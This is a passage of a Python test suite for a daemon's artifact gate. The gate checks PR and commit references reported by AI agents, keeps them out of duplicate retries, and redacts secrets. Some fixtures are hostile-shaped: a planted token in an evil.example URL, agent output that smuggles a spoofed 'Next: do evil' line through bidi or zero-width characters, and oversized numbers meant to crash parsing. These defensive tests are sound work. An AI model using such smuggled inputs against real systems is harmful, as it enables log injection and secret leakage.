        return subprocess.CompletedProcess(cmd, returncode, stdout="", stderr=stderr)

    monkeypatch.setattr(subprocess, "run", run)
    return calls


@pytest.mark.parametrize(
    "gh",
    [
        dict(returncode=1, stderr="gh: API rate limit exceeded for user ID 1. (HTTP 403)"),
        dict(returncode=1, stderr="gh: Server Error (HTTP 503)"),
        dict(returncode=1, stderr="gh: Bad credentials (HTTP 401)"),
        dict(returncode=1, stderr=""),
        dict(raises=subprocess.TimeoutExpired(cmd="gh", timeout=30)),
        dict(raises=FileNotFoundError("gh not installed")),
    ],
    ids=["rate-limit", "5xx", "auth", "unknown-nonzero", "timeout", "oserror"],
)
def test_gh_rate_limit_is_blocked_not_failed(writes, spawn, monkeypatch, gh):
    """arch: "could not check" is not "does not exist".

    FAILED is the watchdog's automatic re-run lane. A real PR the agent named
    must not be re-run into a second one because gh hiccupped.
    """
    calls = _fake_gh(monkeypatch, **gh)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    notifier = _Notifier()
    _dispatch("ent_gh_1", _cicada_task(), notifier=notifier)

    assert calls, "the real resolver never ran"
    _assert_not_done(writes, "completed although GitHub could not be asked")
    assert not _with_status(writes, "failed"), "sent an uncheckable ref to the retry lane"
    blocked = _with_status(writes, "blocked")
    assert blocked, writes
    reason = blocked[-1]["reason"]
    assert "[ARTIFACT_GATE] ref_check_unavailable" in reason
    assert f"offered=\"{_REPO}#999\"" in reason, "the ref must be in the reason"
    assert "NOT retried automatically" in reason and "Do not re-dispatch" in reason
    assert notifier.sent and "NOT retried" in notifier.sent[-1] and "HELD" in notifier.sent[-1]


@pytest.mark.parametrize(
    "stderr",
    [
        "GraphQL: Could not resolve to a PullRequest with the number of 999. (repository.pullRequest)",
    ],
)
def test_definitive_not_found_is_failed(writes, spawn, monkeypatch, stderr):
    _fake_gh(monkeypatch, returncode=1, stderr=stderr)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_gh_2", _cicada_task())
    _assert_not_done(writes, "accepted a PR GitHub says does not exist")
    failed = _with_status(writes, "failed")
    assert failed and "[ARTIFACT_GATE] unresolvable_ref" in failed[-1]["reason"]
    assert "re-runs it automatically" in failed[-1]["reason"]
    assert not _with_status(writes, "blocked")


def test_gh_success_with_the_real_resolver_is_done(writes, spawn, monkeypatch):
    calls = _fake_gh(monkeypatch, returncode=0)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_gh_3", _cicada_task())
    assert [w for w in writes if w.get("fn") == "complete_task_with_result"]
    assert calls[0][:3] == ["gh", "pr", "view"] and "--repo" in calls[0]


def test_resolver_returns_the_tri_state_strings(monkeypatch):
    from lib.daemon_runtime.artifact_contract import ParsedRef

    ref = ParsedRef(kind="pr", owner="o", repo="r", number=1, canonical="o/r#1")
    _fake_gh(monkeypatch, returncode=0)
    assert apis.resolve_artifact_ref(ref) == "exists"
    _fake_gh(monkeypatch, returncode=1, stderr="Could not resolve to a PullRequest")
    assert apis.resolve_artifact_ref(ref) == "absent"
    _fake_gh(monkeypatch, returncode=1, stderr="API rate limit exceeded (HTTP 403)")
    assert apis.resolve_artifact_ref(ref) == "unavailable"
    _fake_gh(monkeypatch, raises=subprocess.TimeoutExpired(cmd="gh", timeout=1))
    assert apis.resolve_artifact_ref(ref) == "unavailable"
    _fake_gh(monkeypatch, raises=OSError("boom"))
    assert apis.resolve_artifact_ref(ref) == "unavailable"
    assert apis._normalize_ref_check(True) == "exists"
    assert apis._normalize_ref_check(False) == "absent"
    assert apis._normalize_ref_check("garbage") == "unavailable"


def test_uncheckable_ref_never_reaches_the_resolver_or_the_retry_lane(
    writes, spawn, monkeypatch
):
    """A task with no repo and a bare #N: BLOCKED, resolver never called."""
    resolves: list = []
    monkeypatch.setattr(
        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append(a) or "exists"
    )
    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link: #42\n")
    snapshot = _cicada_task()
    snapshot.pop("repo")
    _dispatch("ent_norepo_1", snapshot)
    assert resolves == []
    assert not _with_status(writes, "failed")
    blocked = _with_status(writes, "blocked")
    assert blocked and "ref_unverifiable" in blocked[-1]["reason"]
    assert 'offered="#42"' in blocked[-1]["reason"]


def test_prose_role_record_not_saved_does_not_talk_about_a_pr(
    entity, status_writes, spawn, job, monkeypatch
):
    """ux: `record_not_saved` fires for all gated roles; the PR wording is false for prose."""
    ent = entity(drop={"result"})
    monkeypatch.setattr(apis, "_resolve_skill", lambda *a, **k: "regulus")
    monkeypatch.setattr(apis, "_resolve_role", lambda *a, **k: "regulus")
    long_note = "reworded the install section " * 12
    line = f"[regulus] docs_diff_or_no_change_note: {long_note.strip()}"
    spawn.result = _SpawnResult(stdout=line + "\n", skill="regulus")
    notifier = _Notifier()
    _dispatch("ent_prose_rns_1", _cicada_task(), notifier=notifier)

    blocked = _with_status(status_writes, "blocked")
    assert blocked, status_writes
    reason = blocked[-1]["reason"]
    assert "record_not_saved" in reason
    assert "second PR" not in reason and "The PR" not in reason, reason
    assert "redo the work" in reason and "Do not re-dispatch" in reason
    assert "<the PR" not in reason
    assert ent.fields["status"] != "done"
    assert "did NOT save" in notifier.sent[-1]
    # Named for what happened, not as an artifact-gate refusal.
    assert job.failed_events and "task record not saved" in job.failed_events[-1][0]
    assert "artifact gate" not in job.failed_events[-1][0]
    # The deliverable text is recorded IN FULL by the printed command (never a
    # truncated value), and is not embedded in the reason head.
    argv = _command_argv(reason)
    result_cmd = next(a for a in argv if "result" in a)
    assert result_cmd[-1] == line, "the recorded value must be the full deliverable line"
    assert "ref=" not in reason.split("\n")[0], "agent text must not be in the head"


def test_pr_role_record_not_saved_keeps_the_pr_wording(
    entity, status_writes, stages, spawn, monkeypatch
):
    entity(drop={"status"})
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_pr_rns_1", _cicada_task())
    reason = _with_status(status_writes, "blocked")[-1]["reason"]
    assert "The PR or commit exists" in reason and "second one" in reason
    result_cmd = next(a for a in _command_argv(reason) if "result" in a)
    assert result_cmd[-1] == _PR_HEADER


class _StaleEntity(_TaskEntity):
    """The first `stale_reads` snapshot reads return an old copy (stale read-back)."""

    def __init__(self, *, stale_reads, preset=None, **kw):
        super().__init__(**kw)
        self.stale_reads = stale_reads
        self.stale = {"status": "executing", "result": ""}
        if preset:
            self.fields.update(preset)

    def snapshot(self, _entity_id):
        if self.stale_reads > 0:
            self.stale_reads -= 1
            return dict(self.stale)
        return dict(self.fields)


def _use(monkeypatch, ent):
    monkeypatch.setattr(tl, "NEOTOMA_BEARER_TOKEN", "test-token")
    monkeypatch.setattr(tl.httpx, "post", ent.post)
    monkeypatch.setattr(apis, "fetch_task_snapshot", ent.snapshot)


def test_stale_readback_of_a_done_task_is_treated_as_saved(
    status_writes, stages, spawn, job, monkeypatch
):
    """One more read before BLOCKED: a stale read-back must not block a DONE task."""
    ent = _StaleEntity(stale_reads=1, preset={"status": "done", "result": _PR_HEADER})
    _use(monkeypatch, ent)
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_stale_1", _cicada_task())
    assert not _with_status(status_writes, "blocked"), "blocked a task that is DONE"
    assert len(job.finished_events) == 1 and "done" in stages


def test_stale_readback_never_overwrites_a_done_task(
    status_writes, spawn, job, monkeypatch
):
    """A task that is DONE with a DIFFERENT result is never overwritten by BLOCKED."""
    ent = _StaleEntity(
        stale_reads=0, drop={"result", "status"},
        preset={"status": "done", "result": "someone else's result"},
    )
    _use(monkeypatch, ent)
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    notifier = _Notifier()
    _dispatch("ent_stale_2", _cicada_task(), notifier=notifier)
    assert not [w for w in status_writes if _status_of(w) in {"blocked", "failed"}], (
        "wrote a status over a DONE task"
    )
    assert notifier.sent and "already DONE with a different result" in notifier.sent[-1]
    assert not job.finished_events and job.failed_events


def test_gate_status_keys_carry_the_attempt_not_just_the_trigger(writes, spawn, monkeypatch):
    """The watchdog re-dispatches with a constant trigger; attempts 2 and 3 must
    not replay attempt 1's idempotency key."""
    spawn.result = _SpawnResult(stdout="no header\n")
    suffixes = []
    for attempt in (1, 2, 3):
        writes.clear()
        _dispatch(
            f"ent_key_{attempt}", _cicada_task(attempt=attempt), trigger="watchdog_retry"
        )
        suffixes.append(_with_status(writes, "failed")[-1]["key_suffix"])
    assert suffixes == ["watchdog_retry-1", "watchdog_retry-2", "watchdog_retry-3"]


def test_completion_key_carries_the_attempt(writes, spawn, monkeypatch):
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_key_c", _cicada_task(attempt=2), trigger="watchdog_retry")
    done = [w for w in writes if w.get("fn") == "complete_task_with_result"]
    assert done and done[-1]["key_suffix"] == "watchdog_retry-2"


def test_cross_repo_pr_url_is_blocked_not_retried(writes, spawn, monkeypatch):
    """A real PR in the WRONG repo exists; a retry would open another one."""
    resolves: list = []
    monkeypatch.setattr(
        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append(a) or "exists"
    )
    spawn.result = _SpawnResult(
        stdout="[cicada] pull_request_link: https://github.com/other/repo/pull/1\n"
    )
    _dispatch("ent_cross_1", _cicada_task())
    assert resolves == []
    assert not _with_status(writes, "failed")
    blocked = _with_status(writes, "blocked")
    assert blocked and "ref_unverifiable" in blocked[-1]["reason"]
    assert "cross-repo" in blocked[-1]["reason"]
    assert f"expected_repo={_REPO}" in blocked[-1]["reason"]


@pytest.mark.parametrize(
    "body",
    [
        "https://github.com/some-org/some-repo/pull/7",
        "#42",
        "PR #42",
        "ab" * 20,
        "a1b2c3d",
        "https://github.com/other/repo/pull/1",
    ],
)
def test_task_with_no_known_repo_is_never_left_failed(writes, spawn, monkeypatch, body):
    """qa: about two thirds of prod Cicada tasks carry no repo field.

    Before the gate they went DONE. A real PR URL, bare #N, or full SHA on such
    a task cannot be checked, and FAILED is the watchdog's automatic re-run lane
    (a second PR). Every one of them is BLOCKED, with the offered ref in the
    reason and the "PR exists; do not re-dispatch" instruction.
    """
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: "exists")
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {body}\n")
    snapshot = _cicada_task()
    snapshot.pop("repo")
    notifier = _Notifier()
    _dispatch("ent_norepo_any", snapshot, notifier=notifier)

    _assert_not_done(writes, f"completed an uncheckable ref {body!r}")
    assert not _with_status(writes, "failed"), f"{body!r} left in the watchdog retry lane"
    blocked = _with_status(writes, "blocked")
    assert blocked, writes
    reason = blocked[-1]["reason"]
    assert "ref_unverifiable" in reason and f'offered="{body}"' in reason
    assert "expected_repo=(none recorded on the task)" in reason
    assert "may already exist" in reason and "Do not re-dispatch" in reason
    assert notifier.sent and "NOT retried" in notifier.sent[-1]


# ── Round-4 review findings (security, arch, ux) ─────────────────────────────
#
# What these looked like RED (each against the code before its fix):
#
#     test_huge_pr_number_never_escapes_dispatch
#         ValueError: Exceeds the limit (4300 digits) for integer string
#         conversion -- raised out of dispatch_task, task left EXECUTING
#
#     test_secret_in_the_offered_ref_appears_in_no_channel
#         AssertionError: token leaked into the operator notification
#
#     test_a_404_on_the_sha_path_is_unavailable_not_absent
#         AssertionError: a 404 from the commit lookup was written FAILED
#
#     test_printed_recovery_commands_split_into_the_exact_argv
#         (the printed line was one prose sentence whose value token was 'X,')

import shlex  # noqa: E402


def _command_argv(reason: str) -> list[list[str]]:
    """The copy-ready command lines a reason prints, each split like a shell would."""
    return [
        shlex.split(line.strip())
        for line in reason.splitlines()
        if line.startswith("  neotoma ")
    ]


@pytest.mark.parametrize(
    "body",
    ["#" + "9" * 5000, f"https://github.com/{_REPO}/pull/" + "9" * 5000, "PR #" + "9" * 4400],
)
def test_huge_pr_number_never_escapes_dispatch(writes, spawn, monkeypatch, body):
    """security: `int()` over thousands of digits raised ValueError out of dispatch."""
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: "exists")
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {body}\n")
    notifier = _Notifier()
    _dispatch("ent_huge_1", _cicada_task(), notifier=notifier)  # must not raise
    _assert_not_done(writes, "completed on an absurd PR number")
    assert _with_status(writes, "failed") or _with_status(writes, "blocked"), (
        "left the task with no status"
    )
    assert notifier.sent, "no alert for an unparseable ref"


def test_a_gate_exception_outside_the_parse_is_blocked(writes, spawn, monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("classifier exploded")

    monkeypatch.setattr(apis, "classify_artifact_body", boom)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    notifier = _Notifier()
    _dispatch("ent_boom_2", _cicada_task(), notifier=notifier)
    blocked = _with_status(writes, "blocked")
    assert blocked and "[ARTIFACT_GATE] gate_error" in blocked[-1]["reason"]
    assert "RuntimeError" in blocked[-1]["reason"] and notifier.sent
    assert not [w for w in writes if w.get("fn") == "complete_task_with_result"]


# Built at runtime from fragments, and named for what it is: a literal assigned to a
# secret-shaped name is exactly what the secret scanner (rightly) flags.
PLANTED = "-".join(["planted", "value", "1234", "abcd"])


@pytest.mark.parametrize(
    "body",
    [
        f"https://evil.example/{PLANTED}/pull/1",                # invalid_ref_shape
        f"prose with {PLANTED} in it",                            # wrong_body_for_dispatch
        f"https://github.com/other/repo/pull/1#{PLANTED}",        # near miss (unverifiable)
        f"BLOCKED — need {PLANTED}",                              # honest agent
    ],
)
def test_secret_in_the_offered_ref_appears_in_no_channel(spawn, monkeypatch, body):
    """security: `offered=` is agent text; it must be redacted everywhere it lands."""
    monkeypatch.setenv("GITHUB_TOKEN", PLANTED)
    recorded: list[str] = []
    monkeypatch.setattr(apis, "RUN_CONVERSATIONS", True)
    monkeypatch.setattr(
        apis, "create_run_session",
        lambda **kw: SimpleNamespace(
            conversation_id="c", agent_session_id="s", native_session_id="n"
        ),
    )
    monkeypatch.setattr(apis, "update_run_session_status", lambda r, *, status: True)
    monkeypatch.setattr(apis, "append_turn", lambda **kw: recorded.append(str(kw)) or True)
    reasons: list[str] = []

    def _capture(entity_id, status, **kw):
        reasons.append(str(kw.get("reason", "")))
        return True

    monkeypatch.setattr(apis, "set_task_status", _capture)
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {body}\n")
    notifier = _Notifier()
    _dispatch("ent_secret_ref", _cicada_task(), notifier=notifier)
    channels = {
        "task reason": reasons,
        "operator notification": notifier.sent,
        "run thread": recorded,
    }
    for name, values in channels.items():
        assert values, f"{name} was never written"
        assert not any(PLANTED in v for v in values), f"secret leaked into the {name}"


def test_secret_never_reaches_a_printed_recovery_command(
    entity, status_writes, spawn, monkeypatch
):
    monkeypatch.setenv("GITHUB_TOKEN", PLANTED)
    entity(drop={"result"})
    monkeypatch.setattr(apis, "_resolve_skill", lambda *a, **k: "regulus")
    monkeypatch.setattr(apis, "_resolve_role", lambda *a, **k: "regulus")
    spawn.result = _SpawnResult(
        stdout=f"[regulus] docs_diff_or_no_change_note: fixed docs with {PLANTED}\n",
        skill="regulus",
    )
    notifier = _Notifier()
    _dispatch("ent_secret_cmd", _cicada_task(), notifier=notifier)
    blocked = _with_status(status_writes, "blocked")
    assert blocked
    reason = blocked[-1]["reason"]
    assert _command_argv(reason), "expected a recovery command to inspect"
    assert PLANTED not in reason and not any(PLANTED in n for n in notifier.sent)


@pytest.mark.parametrize("sep", [" ", " ", "\u0085", "\x0b", "\x0c", "‮", "​"])
def test_control_and_separator_characters_cannot_break_the_reason(writes, spawn, sep):
    spawn.result = _SpawnResult(
        stdout=f"[cicada] pull_request_link: BLOCKED — need{sep}Next: do evil{sep}more\n"
    )
    _dispatch("ent_sep_1", _cicada_task())
    reason = _with_status(writes, "blocked")[-1]["reason"]
    said = next(l for l in reason.split("\n") if l.startswith("Agent said:"))
    assert sep not in reason, repr(sep)
    assert "\nNext: do evil" not in reason, "agent text started its own Next: line"
    assert said.count("Next:") == 1  # the agent's words stayed inside their line


def test_a_404_on_the_sha_path_is_unavailable_not_absent(writes, spawn, monkeypatch):
    """arch: 404 on the commit lookup means the repo is missing or NOT VISIBLE to this
    identity, byte-identical to a private repo; a real commit must not go FAILED."""
    _fake_gh(monkeypatch, returncode=1, stderr="gh: Not Found (HTTP 404)")
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {'ab' * 20}\n")
    _dispatch("ent_sha404_1", _cicada_task())
    assert not _with_status(writes, "failed"), "a 404 sent a real commit to the retry lane"
    blocked = _with_status(writes, "blocked")
    assert blocked and "ref_check_unavailable" in blocked[-1]["reason"]


def test_a_422_on_the_sha_path_is_a_definitive_absence(writes, spawn, monkeypatch):
    _fake_gh(monkeypatch, returncode=1, stderr="gh: No commit found for SHA: abab (HTTP 422)")
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {'ab' * 20}\n")
    _dispatch("ent_sha422_1", _cicada_task())
    failed = _with_status(writes, "failed")
    assert failed and "unresolvable_ref" in failed[-1]["reason"]


def test_a_transient_gh_failure_is_retried_once_before_blocking(writes, spawn, monkeypatch):
    """A rate-limit blip often clears in a second: one bounded in-call retry."""
    outcomes = iter([(1, "API rate limit exceeded (HTTP 403)"), (0, "")])
    calls: list[list[str]] = []

    def run(cmd, **kw):
        calls.append(cmd)
        rc, err = next(outcomes)
        return subprocess.CompletedProcess(cmd, rc, stdout="", stderr=err)

    monkeypatch.setattr(subprocess, "run", run)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_retry_1", _cicada_task())
    assert len(calls) == 2
    assert [w for w in writes if w.get("fn") == "complete_task_with_result"]


def test_persistent_gh_failure_makes_exactly_two_attempts(writes, spawn, monkeypatch):
    calls = _fake_gh(monkeypatch, returncode=1, stderr="API rate limit exceeded (HTTP 403)")
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_retry_2", _cicada_task())
    assert len(calls) == apis._RESOLVE_ATTEMPTS == 2
    assert _with_status(writes, "blocked")


@pytest.mark.parametrize(
    "body",
    [
        f"https://github.com/{_REPO}/pull/999/files",
        f"https://github.com/{_REPO}/pull/999#issuecomment-1",
        f"https://github.com/{_REPO}/pull/999?diff=split&w=1",
        f"Opened https://github.com/{_REPO}/pull/999 for review",
        f"https://github.com/{_REPO}/issues/999",
    ],
)
def test_near_miss_github_links_are_blocked_not_retried(writes, spawn, monkeypatch, body):
    """arch: a same-repo PR link with a suffix / wrapper sentence very likely means a PR
    exists; FAILED would re-run the agent into a duplicate."""
    resolves: list = []
    monkeypatch.setattr(
        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append(a) or "exists"
    )
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {body}\n")
    _dispatch("ent_near_1", _cicada_task())
    assert resolves == [], "handed a near-miss body to the resolver"
    assert not _with_status(writes, "failed")
    blocked = _with_status(writes, "blocked")
    assert blocked and "ref_unverifiable" in blocked[-1]["reason"]
    assert "contains a GitHub link" in blocked[-1]["reason"]


def test_printed_recovery_commands_split_into_the_exact_argv(writes, spawn, monkeypatch):
    """ux: the printed commands must be pasteable: separate lines, `--api-only`, real
    values, a read-back, and the argv a shell would produce."""
    spawn.result = _SpawnResult(
        stdout="[cicada] pull_request_link: https://github.com/some-org/some-repo/pull/7\n"
    )
    snapshot = _cicada_task()
    snapshot.pop("repo")
    _dispatch("ent_cmd_1", snapshot)
    reason = _with_status(writes, "blocked")[-1]["reason"]
    argv = _command_argv(reason)
    base = ["neotoma", "--api-only", "corrections", "create", "--entity-id", "ent_cmd_1",
            "--entity-type", "task"]
    assert argv == [
        base + ["--field-name", "result", "--corrected-value",
                "https://github.com/some-org/some-repo/pull/7"],
        base + ["--field-name", "status", "--corrected-value", "done"],
        ["neotoma", "--api-only", "entities", "get", "ent_cmd_1"],
    ]
    assert "then the same with" not in reason, "recovery must not be a prose sentence"


def test_no_command_carries_a_placeholder_value(writes, spawn):
    """ux: pasting unedited must never record a placeholder as the result."""
    for i, stdout in enumerate(
        ["no header at all\n", "[cicada] pull_request_link:   \n",
         "[cicada] pull_request_link: some prose\n",
         "[cicada] pull_request_link: #42\n"]
    ):
        writes.clear()
        snapshot = _cicada_task()
        if "#42" in stdout:
            snapshot.pop("repo")
        spawn.result = _SpawnResult(stdout=stdout)
        _dispatch(f"ent_ph_{i}", snapshot)
        reasons = [w.get("reason", "") for w in writes if w.get("reason")]
        assert reasons, stdout
        for reason in reasons:
            assert "<" not in "".join(
                " ".join(a) for a in _command_argv(reason)
            ), f"placeholder in a printed command: {reason}"
            assert "corrected-value '<" not in reason


def test_overlong_deliverable_is_never_truncated_into_a_command(
    entity, status_writes, spawn, monkeypatch
):
    entity(drop={"result"})
    monkeypatch.setattr(apis, "_resolve_skill", lambda *a, **k: "regulus")
    monkeypatch.setattr(apis, "_resolve_role", lambda *a, **k: "regulus")
    long_text = "word " * 400
    spawn.result = _SpawnResult(
        stdout=f"[regulus] docs_diff_or_no_change_note: {long_text}\n", skill="regulus"
    )
    _dispatch("ent_long_1", _cicada_task())
    reason = _with_status(status_writes, "blocked")[-1]["reason"]
    assert _command_argv(reason) == [], "emitted a command for a value that does not fit"
    assert "too long to embed" in reason and "stdout" in reason
    assert "…" not in reason.split("Next:")[1], "a truncated value would be recorded"


def test_reopen_command_is_printed_for_an_honest_blocked_agent(writes, spawn):
    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link: BLOCKED — need repo access\n")
    _dispatch("ent_reopen_1", _cicada_task())
    reason = _with_status(writes, "blocked")[-1]["reason"]
    assert _command_argv(reason) == [[
        "neotoma", "--api-only", "corrections", "create", "--entity-id", "ent_reopen_1",
        "--entity-type", "task", "--field-name", "status", "--corrected-value", "routed",
    ]]
    assert "routed" in reason and "stall window" in reason


def test_record_not_saved_wording_follows_the_accepted_shape_not_the_role(
    entity, status_writes, spawn, monkeypatch
):
    """A Cicada ordered_spec ENG_SPEC_SECTION deliverable is not a PR."""
    entity(drop={"result"})
    spawn.result = _SpawnResult(
        stdout="[cicada] pull_request_link: ENG_SPEC_SECTION authored for ateles#1155\n"
    )
    _dispatch("ent_spec_rns", _cicada_task(dispatch_mode="ordered_spec"))
    reason = _with_status(status_writes, "blocked")[-1]["reason"]
    assert "record_not_saved" in reason
    assert "The PR" not in reason and "second PR" not in reason
    assert "redo the work" in reason


def test_head_has_labelled_fields_not_a_run_together_sentence(writes, spawn):
    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link: #42\n")
    snapshot = _cicada_task()
    snapshot.pop("repo")
    _dispatch("ent_head_1", snapshot)
    head = _with_status(writes, "blocked")[-1]["reason"].split("\n")[0]
    assert 'offered="#42" expected_repo=(none recorded on the task) detail="' in head
    assert "task PR URL" not in head


@pytest.mark.parametrize(
    "body,expect",
    [
        ("https://github.com/some-org/some-repo/pull/7", "no repo"),           # no_repo
        ("a1b2c3d", "abbreviated SHA"),                                          # short_sha
        ("https://github.com/other/repo/pull/1", "different repo"),              # other_repo
        (f"See https://github.com/{_REPO}/pull/9/files", "not exactly one PR URL"),  # near_miss
    ],
)
def test_ref_unverifiable_has_a_hint_per_situation_and_a_gh_check(writes, spawn, body, expect):
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {body}\n")
    snapshot = _cicada_task()
    if "some-org" in body or body == "a1b2c3d":
        snapshot.pop("repo")
    _dispatch("ent_sit_1", snapshot)
    reason = _with_status(writes, "blocked")[-1]["reason"]
    assert expect in reason, reason
    if "github.com/some-org" in body or "other/repo" in body:
        assert "Check it: gh pr view" in reason
    if body == "a1b2c3d":
        assert "Check it:" not in reason, "no repo known: no placeholder command"


def test_prose_identity_in_the_idempotency_key_is_a_hash_not_agent_text(
    writes, spawn, monkeypatch
):
    monkeypatch.setattr(apis, "_resolve_skill", lambda *a, **k: "regulus")
    monkeypatch.setattr(apis, "_resolve_role", lambda *a, **k: "regulus")
    text = "agent-chosen words " * 8
    spawn.result = _SpawnResult(
        stdout=f"[regulus] docs_diff_or_no_change_note: {text}\n", skill="regulus"
    )
    _dispatch("ent_hash_1", _cicada_task())
    done = [w for w in writes if w.get("fn") == "complete_task_with_result"][-1]
    identity = done["artifact_identity"]
    assert identity.startswith("text-") and len(identity) == len("text-") + 16
    assert "agent-chosen" not in identity


def test_exception_text_in_a_gate_error_is_redacted(writes, spawn, monkeypatch):
    """The alias redacts every field, not only the header body the verdict redacts once."""
    monkeypatch.setenv("GITHUB_TOKEN", PLANTED)

    def boom(*a, **k):
        raise RuntimeError(f"failed while holding {PLANTED}")

    monkeypatch.setattr(apis, "classify_artifact_body", boom)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    notifier = _Notifier()
    _dispatch("ent_boom_secret", _cicada_task(), notifier=notifier)
    blocked = _with_status(writes, "blocked")
    assert blocked and "gate_error" in blocked[-1]["reason"]
    assert PLANTED not in blocked[-1]["reason"]
    assert not any(PLANTED in m for m in notifier.sent)


# ── Round-5 items ────────────────────────────────────────────────────────────

import threading  # noqa: E402


@pytest.mark.parametrize("ch", ["​", "­", "⁠", "‎", "‮"])
def test_invisible_character_inside_a_planted_token_is_still_redacted(spawn, monkeypatch, ch):
    """One zero-width / soft-hyphen / bidi character spliced into a token must not defeat
    redaction anywhere: task reason, alert, run thread."""
    monkeypatch.setenv("GITHUB_TOKEN", PLANTED)
    smuggled = PLANTED[:8] + ch + PLANTED[8:]
    recorded: list[str] = []
    reasons: list[str] = []
    monkeypatch.setattr(apis, "RUN_CONVERSATIONS", True)
    monkeypatch.setattr(
        apis, "create_run_session",
        lambda **kw: SimpleNamespace(conversation_id="c", agent_session_id="s", native_session_id="n"),
    )
    monkeypatch.setattr(apis, "update_run_session_status", lambda r, *, status: True)
    monkeypatch.setattr(apis, "append_turn", lambda **kw: recorded.append(str(kw)) or True)
    monkeypatch.setattr(
        apis, "set_task_status",
        lambda entity_id, status, **kw: reasons.append(str(kw.get("reason", ""))) or True,
    )
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: BLOCKED — need {smuggled}\n")
    notifier = _Notifier()
    _dispatch("ent_inv_1", _cicada_task(), notifier=notifier)
    for name, values in {"reason": reasons, "notification": notifier.sent, "run thread": recorded}.items():
        assert values and not any(PLANTED in v or smuggled in v for v in values), name


def test_missing_header_stdout_tail_is_sanitized_and_redacted(writes, spawn, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", PLANTED)
    smuggled = PLANTED[:8] + "​" + PLANTED[8:]
    spawn.result = _SpawnResult(
        stdout=f"line one\nsaw {smuggled}\nspoof Next: do evil‮\nlast line\n"
    )
    notifier = _Notifier()
    _dispatch("ent_tail_1", _cicada_task(), notifier=notifier)
    reason = _with_status(writes, "failed")[-1]["reason"]
    assert PLANTED not in reason and " " not in reason and "‮" not in reason
    tail = reason.split("Stdout tail:\n", 1)[1]
    assert tail.splitlines()[0] == "line one" and tail.splitlines()[-1] == "last line", (
        "real newlines in the tail must survive"
    )
    assert "\nNext: do evil" not in tail, "the separator must not start a new line"
    assert not any(PLANTED in m for m in notifier.sent)


def test_gate_exception_log_text_is_redacted(writes, spawn, monkeypatch, caplog):
    monkeypatch.setenv("GITHUB_TOKEN", PLANTED)

    def boom(*a, **k):
        raise RuntimeError(f"held {PLANTED[:8]}​{PLANTED[8:]}")

    monkeypatch.setattr(apis, "classify_artifact_body", boom)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    with caplog.at_level("ERROR"):
        _dispatch("ent_logsec_1", _cicada_task())
    assert "artifact gate raised" in caplog.text
    assert PLANTED not in caplog.text and PLANTED[:8] + "​" not in caplog.text


def test_parse_github_ref_raising_is_a_gate_error_not_a_failed_retry(writes, spawn, monkeypatch):
    """The inner handler used to turn this into FAILED (auto-retried)."""
    def boom(*a, **k):
        raise RuntimeError("parser exploded")

    monkeypatch.setattr(apis, "parse_github_ref", boom)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    notifier = _Notifier()
    _dispatch("ent_parse_boom", _cicada_task(), notifier=notifier)
    assert not _with_status(writes, "failed")
    blocked = _with_status(writes, "blocked")
    assert blocked and "[ARTIFACT_GATE] gate_error" in blocked[-1]["reason"]
    assert 'detail="RuntimeError: parser exploded"' in blocked[-1]["reason"]


def test_gate_error_alert_is_worded_as_an_error_not_a_held_reference(writes, spawn, monkeypatch):
    monkeypatch.setattr(apis, "classify_artifact_body", lambda *a: (_ for _ in ()).throw(ValueError("x")))
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    notifier = _Notifier()
    _dispatch("ent_err_1", _cicada_task(), notifier=notifier)
    msg = notifier.sent[-1]
    assert "artifact gate ERROR" in msg and "detail field" in msg and "NOT retried" in msg
    assert "HELD" not in msg and "reference could not be checked" not in msg
    reason = _with_status(writes, "blocked")[-1]["reason"]
    assert "error below" not in reason and "detail field" in reason
    assert "PR" not in reason.split("Next:")[0].split("—", 1)[1], "gate_error wording must suit prose roles"


def test_no_repo_check_line_has_no_placeholder(writes, spawn):
    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link: #42\n")
    snapshot = _cicada_task()
    snapshot.pop("repo")
    _dispatch("ent_chk_1", snapshot)
    reason = _with_status(writes, "blocked")[-1]["reason"]
    assert "Check it:" not in reason and "<owner" not in reason and "<name" not in reason
    assert "find the real PR or commit" in reason


def test_unavailable_check_on_a_pr_ref_carries_a_check_line_when_the_repo_is_known(
